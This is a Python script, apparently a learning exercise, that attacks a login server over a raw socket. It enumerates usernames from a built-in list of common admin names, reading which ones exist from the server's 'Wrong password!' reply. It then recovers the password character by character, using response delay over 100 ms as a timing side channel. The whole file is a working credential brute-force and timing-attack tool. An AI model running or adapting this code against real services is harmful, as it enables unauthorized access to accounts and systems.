import itertools
import datetime
import string
import socket
import json
import sys


typical_logins = """
admin
Admin
admin1
admin2
admin3
user1
user2
root
default
new_user
some_user
new_admin
administrator
Administrator
superuser
super
su
alex
suser
rootuser
adminadmin
useruser
superadmin
username
username1
"""


args = sys.argv
server_address = args[1]
server_port = int(args[2])


def symbol_generator():
    while True:
        for it in string.ascii_letters + string.digits:
            yield it


def login_generator():
    logins = typical_logins.splitlines()
    for login in logins:
        if len(login) > 0:
            yield login


class CredentialsGenerator:
    def __init__(self):
        self.login_generator = login_generator()
        self.symbol_generator = symbol_generator()
        self.login = None
        self.last_login = None
        self.password = None
        self.last_password = None
        self.password_buffer = ''
        self.is_done = False

    def next_request(self):
        if self.login is None:
            self.last_login = next(self.login_generator)
            data = {'login': self.last_login, 'password': ' '}
        elif self.password is None:
            self.last_password = self.password_buffer + next(self.symbol_generator)
            data = {'login': self.login, 'password': self.last_password}
        else:
            data = {'login': self.login, 'password': self.password}
        return json.dumps(data)

    def parse_response(self, response, duration):
        data = json.loads(response)
        if self.login is None and data['result'] == 'Wrong password!':
            self.login = self.last_login
        elif data['result'] == 'Connection success!':
            self.password = self.last_password
            self.is_done = True
        elif duration.microseconds > 100000:
            self.symbol_generator = symbol_generator()
            self.password_buffer = self.last_password
        elif data['result'] == 'Too many attempts to connect!' or data['result'] == 'Bad request!':
            self.is_done = True


class SocketClient:
    def __init__(self, address, port):
        self.sock = None
        self.address = address
        self.port = port

    def __enter__(self):
        self.sock = socket.socket()
        self.sock.connect((self.address, self.port))
        return self

    def send(self, data):
        self.sock.send(data.encode('utf-8'))
        return self.sock.recv(1024).decode('utf-8')

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.sock.close()


with SocketClient(server_address, server_port) as sock_client:
    generator = CredentialsGenerator()
    while not generator.is_done:
        req = generator.next_request()
        start = datetime.datetime.now()
        # print(f'Request: {req}')
        resp = sock_client.send(req)
        finish = datetime.datetime.now()
        # print(f'Response: {resp}, in {finish - start}')
        generator.parse_response(resp, finish - start)
    print(generator.next_request())
